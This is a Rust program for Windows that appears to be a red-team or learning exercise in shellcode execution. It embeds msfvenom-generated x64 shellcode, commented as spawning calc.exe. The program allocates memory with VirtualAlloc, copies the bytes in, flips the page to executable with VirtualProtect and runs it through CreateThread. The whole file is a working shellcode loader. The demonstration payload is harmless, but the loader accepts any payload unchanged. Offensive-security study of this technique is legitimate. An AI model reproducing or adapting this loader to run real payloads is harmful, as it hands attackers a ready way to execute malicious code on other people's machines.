use windows::Win32::System::Memory::{
                                     VirtualAlloc,
                                     VirtualProtect,
                                     MEM_COMMIT,
                                     PAGE_READWRITE,
                                     MEM_RESERVE,
                                     PAGE_EXECUTE_READ,
                                     PAGE_PROTECTION_FLAGS
                                    };
use windows::Win32::Foundation::{
                                GetLastError,
                                HANDLE
                                };
use windows::Win32::System::Threading::{
                                      CreateThread,
                                      THREAD_CREATION_FLAGS,
                                      WaitForSingleObject,
                                      INFINITE
                                    };
use std::ptr::{
               null_mut,
               copy
               };
use std::io;
use std::mem::transmute;


fn error(msg: &str) {
    unsafe{
        println!("{}: {:?}",msg, GetLastError());
        // remember you can use 'net helpmsg 998' to look at the error code
    }
    return;
}

fn pause(){
    let mut input = String::new();
    println!("PAUSED - PRESS ENTER TO EXIT");
    io::stdin()
            .read_line(&mut input)
            .expect("Error: unable to read user input");
    return;
}

fn main() {
    // breakpoint
    //let shellcode: Vec<u8>= vec![0x90,0x90,0xcc,0xc3];

    // Spawns calc.exe with msfvenom
    let shellcode: Vec<u8>=  vec! [0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,
                                    0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,
                                    0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,
                                    0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,
                                    0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,
                                    0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,
                                    0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,
                                    0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,
                                    0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,
                                    0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,
                                    0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,
                                    0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,
                                    0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,
                                    0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,
                                    0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,
                                    0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,
                                    0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,
                                    0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,
                                    0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,
                                    0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,
                                    0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,
                                    0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,
                                    0x2e,0x65,0x78,0x65,0x00];

    // Get the length and address of shellcode so we can copy it later
    let shellcode_len: usize = shellcode.len();
    let shellcode_ptr = shellcode.as_ptr();

    let mut lp_old_protect= PAGE_PROTECTION_FLAGS(0);

    unsafe {

        // Allocate memory
        let memory_buffer = VirtualAlloc(None,
                                        shellcode_len,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if memory_buffer.is_null(){
            return error("Failed to VirtualAlloc:");
        }

        println!("|--   Shellcode   --| : {:?}",shellcode_ptr);
        println!("|-- Memory Buffer --| : {:?}",memory_buffer);

        // Copy shellcode to the buffer
        copy(shellcode_ptr,memory_buffer as *mut u8,shellcode_len);

        // Set Execute Bit
        let _exec_priv = match VirtualProtect(
                                            memory_buffer,
                                            shellcode_len,
                                            PAGE_EXECUTE_READ,
                                            //null_mut()){
                                            &mut lp_old_protect){
            Ok(exec_priv) => exec_priv,
            Err(_e) =>  {
                error("Failed to run VirtualProtect");
                return;
            }
        };

        // println!("Attach debugger now and search the memory!\n");
        // pause();

        // Execute shellcode
        let thread_handle = match CreateThread(None,
                                            0,
                                            transmute(memory_buffer),
                                            None,
                                            THREAD_CREATION_FLAGS(0),
                                            None){
            Ok(thread_handle) => thread_handle,
            Err(_e) => {
                error("Failed to get thread handle");
                HANDLE(null_mut())
            }
        };
        // Waits for the shellcode to exit before exiting the program
        WaitForSingleObject(thread_handle, INFINITE);
    }
}
